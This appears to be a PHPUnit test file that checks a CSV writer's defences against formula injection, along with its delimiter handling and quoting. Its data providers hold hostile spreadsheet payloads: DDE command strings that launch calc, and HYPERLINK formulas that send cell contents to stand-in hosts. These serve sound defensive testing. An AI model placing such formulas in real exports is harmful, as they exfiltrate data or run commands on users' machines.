<?php

declare(strict_types=1);

namespace Nowo\ControllerKitBundle\Tests\Unit\Http;

use InvalidArgumentException;
use Nowo\ControllerKitBundle\Http\CsvSafeWriter;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use Stringable;

use function explode;
use function fgetcsv;
use function json_encode;
use function ltrim;
use function preg_split;
use function sprintf;

/**
 * Security tests: CSV / formula injection (OWASP) — every formula trigger is neutralised.
 */
final class CsvSafeWriterTest extends TestCase
{
    /**
     * @return iterable<string, array{string, string}>
     */
    public static function formulaPayloads(): iterable
    {
        yield 'equals' => ['=CMD', "'=CMD"];
        yield 'dde payload' => ["=cmd|' /C calc'!A0", "'=cmd|' /C calc'!A0"];
        yield 'hyperlink exfiltration' => ['=HYPERLINK("https://example.invalid/?d="&A1,"x")', "'=HYPERLINK(\"https://example.invalid/?d=\"&A1,\"x\")"];
        yield 'plus' => ['+1', "'+1"];
        yield 'plus formula' => ['+SUM(A1:A9)', "'+SUM(A1:A9)"];
        yield 'minus' => ['-1', "'-1"];
        yield 'minus formula' => ['-2+3', "'-2+3"];
        yield 'at' => ['@mention', "'@mention"];
        yield 'at sum' => ['@SUM(1+1)*cmd|\' /C calc\'!A0', "'@SUM(1+1)*cmd|' /C calc'!A0"];
        yield 'tab' => ["\tx", "'\tx"];
        yield 'tab formula' => ["\t=1+1", "'\t =1+1"];
        yield 'carriage return' => ["\r=1+1", "'\r =1+1"];
    }

    #[DataProvider('formulaPayloads')]
    public function testFormulaTriggersArePrefixedWithAQuote(string $payload, string $expected): void
    {
        self::assertSame($expected, CsvSafeWriter::cell($payload));
    }

    #[DataProvider('formulaPayloads')]
    public function testFormulaTriggersAreNeutralisedInTheWrittenFile(string $payload, string $expected): void
    {
        $handle = $this->memory();
        CsvSafeWriter::write($handle, [$payload]);
        rewind($handle);
        $line = (string) stream_get_contents($handle);

        $parsed = str_getcsv(rtrim($line, "\n"), ',', '"', '');
        self::assertSame([$expected], $parsed);
        self::assertStringStartsWith("'", (string) $parsed[0]);
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function embeddedSeparatorPayloads(): iterable
    {
        yield 'semicolon dde' => ["Hi;=cmd|'/Ccalc'!A0", "Hi; =cmd|'/Ccalc'!A0"];
        yield 'semicolon chain' => ['Order;=1+1;@SUM(2)', 'Order; =1+1; @SUM(2)'];
        yield 'semicolon minus' => ['x;-2+3', 'x; -2+3'];
        yield 'semicolon plus' => ['x;+1', 'x; +1'];
        yield 'comma' => ['a,=1+1', 'a, =1+1'];
        yield 'tab' => ["a\t@SUM(1)", "a\t @SUM(1)"];
        yield 'pipe' => ['a|=1', 'a| =1'];
        yield 'line feed' => ["line1\n=1+1", "line1\n =1+1"];
        yield 'leading line feed' => ["\n=1+1", "\n =1+1"];
        yield 'carriage return' => ["a\r=1", "a\r =1"];
        yield 'separator then tab trigger' => ["a;\t=1", "a; \t =1"];
        yield 'leading trigger and separator' => ['=1;=2', "'=1; =2"];
        yield 'webservice reference' => ['x;=WEBSERVICE(C5&A1)', 'x; =WEBSERVICE(C5&A1)'];
    }

    #[DataProvider('embeddedSeparatorPayloads')]
    public function testFormulaTriggersAfterAnEmbeddedSeparatorGetASpace(string $payload, string $expected): void
    {
        self::assertSame($expected, CsvSafeWriter::cell($payload));
    }

    public function testSeparatorsNotFollowedByATriggerAreKept(): void
    {
        self::assertSame('a;b,c|d', CsvSafeWriter::cell('a;b,c|d'));
        self::assertSame('a; =b', CsvSafeWriter::cell('a; =b'), 'already followed by a space');
        self::assertSame('Total: 1,5', CsvSafeWriter::cell('Total: 1,5'));
        self::assertSame('-12.50', CsvSafeWriter::cell('-12.50', true));
    }

    /**
     * @return iterable<string, array{non-empty-string, non-empty-string}>
     */
    public static function writeAndParseDelimiters(): iterable
    {
        foreach ([',' => 'comma', ';' => 'semicolon', "\t" => 'tab'] as $write => $writeName) {
            foreach ([',' => 'comma', ';' => 'semicolon', "\t" => 'tab'] as $parse => $parseName) {
                yield sprintf('written with %s, parsed with %s', $writeName, $parseName) => [$write, $parse];
            }
        }
    }

    /**
     * Regression for the list-separator bypass: Excel in `;` locales splits `Hi;=cmd|…` into two cells and ignores
     * RFC 4180 quoting in the middle of a line. Whatever delimiter the file is written with and whatever separator
     * the spreadsheet uses (RFC 4180 parser or a quote-unaware split on the separator and on line breaks), no cell
     * may start with a formula trigger.
     *
     * @param non-empty-string $writeDelimiter
     * @param non-empty-string $parseDelimiter
     */
    #[DataProvider('writeAndParseDelimiters')]
    public function testNoParsedCellStartsWithAFormulaTrigger(string $writeDelimiter, string $parseDelimiter): void
    {
        $payloads = [
            '=HYPERLINK("http://evil.invalid/?"&A1,"x")', '+1+1', '-2+3', '@SUM(1+1)', "\t=1+1", "\r=1+1",
            "line1\nline2 \"q\"", "Hi;=cmd|'/Ccalc'!A0", 'Order;=1+1;@SUM(2)', 'x;-2+3', ' =1+1', "\n=1+1",
            'a,=1', "a\t=1", 'a|=1', "a;\t=1", 'a, b;@x', 'x;=WEBSERVICE(C5&A1)',
        ];
        $handle = $this->memory();
        foreach ($payloads as $payload) {
            CsvSafeWriter::write($handle, ['2026-11-01T10:00:00+00:00', 'sent', 'a@x.com, b@y.com', $payload, null, '<id@x>'], $writeDelimiter);
        }
        rewind($handle);
        $csv = (string) stream_get_contents($handle);

        rewind($handle);
        $cells = [];
        while (($row = fgetcsv($handle, null, $parseDelimiter, '"', '')) !== false) {
            foreach ($row as $cell) {
                $cells[] = (string) $cell;
            }
        }
        foreach (preg_split('/\r\n|\r|\n/', $csv) ?: [] as $line) {
            foreach (explode($parseDelimiter, $line) as $cell) {
                $cells[] = $cell;
                $cells[] = ltrim($cell, '"');
            }
        }

        self::assertNotSame([], $cells);
        foreach ($cells as $cell) {
            self::assertDoesNotMatchRegularExpression(CsvSafeWriter::FORMULA_PREFIX_PATTERN, $cell, sprintf('cell %s starts with a formula trigger', json_encode($cell)));
        }
    }

    public function testSafeTextAndScalarsAreWrittenAsTheyAre(): void
    {
        self::assertSame('safe', CsvSafeWriter::cell('safe'));
        self::assertSame('a=b', CsvSafeWriter::cell('a=b'), 'only a leading trigger is a formula');
        self::assertSame(' =x', CsvSafeWriter::cell(' =x'));
        self::assertSame('', CsvSafeWriter::cell(''));
        self::assertSame('', CsvSafeWriter::cell(null));
        self::assertSame('12', CsvSafeWriter::cell(12));
        self::assertSame('1.5', CsvSafeWriter::cell(1.5));
        self::assertSame('-3', CsvSafeWriter::cell(-3), 'a number is never a formula');
        self::assertSame("'-3", CsvSafeWriter::cell('-3'), 'the same text is guarded');
    }

    public function testStringableValuesAreGuarded(): void
    {
        $value = new class implements Stringable {
            public function __toString(): string
            {
                return '=1+1';
            }
        };

        self::assertSame("'=1+1", CsvSafeWriter::cell($value));
    }

    public function testKeepNumericStringsLeavesOnlyPlainDecimalsUnguarded(): void
    {
        self::assertSame('-12.50', CsvSafeWriter::cell('-12.50', true));
        self::assertSame('-3', CsvSafeWriter::cell('-3', true));
        self::assertSame("'-1+2", CsvSafeWriter::cell('-1+2', true));
        self::assertSame("'+12", CsvSafeWriter::cell('+12', true));
        self::assertSame("'=1", CsvSafeWriter::cell('=1', true));
        self::assertSame("'-1e5", CsvSafeWriter::cell('-1e5', true));
    }

    public function testRowGuardsEveryCellAndDropsKeys(): void
    {
        self::assertSame(['ok', "'=x", '', '7'], CsvSafeWriter::row(['a' => 'ok', 'b' => '=x', 'c' => null, 'd' => 7]));
        self::assertSame(['-1'], CsvSafeWriter::row(['-1'], true));
    }

    public function testWriteQuotesLikeRfc4180WithoutEscapeCharacter(): void
    {
        $handle = $this->memory();
        CsvSafeWriter::write($handle, ['ok', '=hack', 'say "hi"', null, 'back\\"slash']);
        rewind($handle);

        self::assertSame("ok,'=hack,\"say \"\"hi\"\"\",,\"back\\\"\"slash\"\n", stream_get_contents($handle));
    }

    public function testWriteUsesTheGivenDelimiter(): void
    {
        $handle = $this->memory();
        CsvSafeWriter::write($handle, ['a;b', '@x', 3], ';');
        rewind($handle);

        self::assertSame("\"a;b\";'@x;3\n", stream_get_contents($handle));
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function invalidDelimiters(): iterable
    {
        yield 'empty' => [''];
        yield 'two bytes' => [';;'];
        yield 'quote' => ['"'];
        yield 'line feed' => ["\n"];
        yield 'carriage return' => ["\r"];
    }

    #[DataProvider('invalidDelimiters')]
    public function testInvalidDelimitersAreRejected(string $delimiter): void
    {
        $this->expectException(InvalidArgumentException::class);

        CsvSafeWriter::write($this->memory(), ['x'], $delimiter);
    }

    public function testTabDelimiterIsAccepted(): void
    {
        CsvSafeWriter::assertDelimiter("\t");

        $this->addToAssertionCount(1);
    }

    public function testBomIsTheUtf8ByteOrderMark(): void
    {
        self::assertSame("\xEF\xBB\xBF", CsvSafeWriter::BOM);
    }

    /**
     * @return resource
     */
    private function memory()
    {
        $handle = fopen('php://memory', 'w+');
        self::assertIsResource($handle);

        return $handle;
    }
}
